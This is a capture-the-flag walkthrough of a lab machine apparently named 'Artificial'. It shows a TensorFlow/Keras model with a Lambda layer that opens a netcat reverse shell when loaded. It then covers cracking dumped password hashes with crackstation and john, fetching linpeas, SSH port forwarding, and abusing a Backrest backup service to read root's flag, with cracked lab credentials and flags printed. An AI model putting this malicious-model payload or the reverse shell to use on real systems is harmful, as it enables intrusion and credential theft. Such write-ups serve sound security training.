# Attack IP 
10.10.11.74

# Dificulty
Community rating - Easy

# Category
Web-based, AI model tensor upload auth-bypass vulnerbility.

# Method of Solve
Nmap scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
So then we head to the website. We see a login/register page, there is little information on so we look, for exploits for tensor where we find [this](https://blog.huntr.com/exposing-keras-lambda-exploits-in-tensorflow-models)

using this and docker we create an AI-model, using the following syntax

```
import tensorflow as tf
import os

def exploit(x):
    import os
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
```
sudo docker build -t myapp .
sudo docker run --rm -it -v $(pwd):/cwd myapp
```
then we move the exploit to the docker to create the model using
```
sudo docker cp /path/to/tensorflow_h5.py DOCKER_CONTAINER_ID:/code/tensorflow_h5.py
```
run in the docker to create the model to be exploited. 
```
sudo docker exec -it crazy_moser python /code/tensorflow_h5.py
```
Then we bring it back to our system to store so we can upload to the target website
```
sudo docker cp DOCKER_CONTAINER_ID:/code/exploit.h5 /path/to/store/
```
from there we run 
```
nc -lvnp 4444
```
from there we upload the model, click View Predictions, and head back to our terminal, we then have reverse shell.
then we find the following is available
```
-rw-rw-r-- 1 app app 7846 Jun  9 13:54 app.py                                                                                                              
drwxr-xr-x 2 app app 4096 Aug 12 01:23 instance                                                                                                            
drwxrwxr-x 2 app app 4096 Aug 12 01:23 models                                                                                                              
drwxr-xr-x 2 app app 4096 Jun  9 13:55 __pycache__                                                                                                         
drwxrwxr-x 4 app app 4096 Jun  9 13:57 static                                                                                                              
drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
```
heading into instance we find users.db
viewing these usernames we can see there is some hashed information attached to the usernames
```
marymary@artificial.htb bf041041e57f1aff3be7ea1abd6129d0
royerroyer@artificial.htb c25b1f80f544c0ab451c02a3dca9fc6
robertrobert@artificial.htb b606c5f5136170f15444251665638b36
markmark@artificial.htb 0f3d8c76530022670f1c6029eed09ccb
gaelgael@artificial.htb c99175974b6e192936d97224638a34f8
```
from there we put them into a hash cracker e.g. https://crackstation.net/
we find that only gael has a password usable being 'mattp005numbertwo'
from there we SSH into the server using the following 
```
ssh gael@10.10.11.74
password: mattp005numbertwo
```
from there we find user.txt and we get our first flag.
```
a34f3a19ef535d740a223d91ff081102
```
then we try for excelation of privlege, we run a http server in the file where linpeas is located.
then from the gaels server we download it using
```
wget http://HOST_IP:8000/linpeas.sh
```
 then 
 ```
 chmod +x linpeas.sh
```
then run it to see ways to increase priv

we notice that there is a few things first one is the active ports
``` 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                                                                          
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                                                                          
tcp6       0      0 :::80                   :::*                    LISTEN      -                                                                          
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
We will come back to this soon
and the second one is 
```
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz
```
this is interesting. we bring it back to our computer using the scp method
```
scp geal@10.10.11.74:/var/backups/backrest_backup.tar.gz /path/to/save
```
then we unzip it and have a look, we see a .config file this is good. look in and find 
```
 "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
```
we put this into a base64 decryption and then using john we get the following 
```
john filename.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```
```
!@#$%^
```
then we use port forwarding on our host machine through ssh to get onto to backup server
```
ssh -L 9898:127.0.0.1:9898 @gael@artificial.htb
```
then we go to our local browers and we go to localhost:9898
then it takes some reading so head [here](https://garethgeorge.github.io/backrest/introduction/getting-started/)
so long and short of it; we log in using backrest_root:!@#$%^
then when we are in the backrest interface we ad a new repo with /tmp repository URI
generate a random password
then go to add plan, do same again but for the path we want it to be root/root.txt
then we click on Backup Now
then click on back up pop-down, scroll down to snapshot browser, '/' 'root' 'root.txt' then click on root.txt and then restore the path.
then do the same again when it does it thing, then boom root flag
2cc9b58679485f25ec0f4d0d877ef141
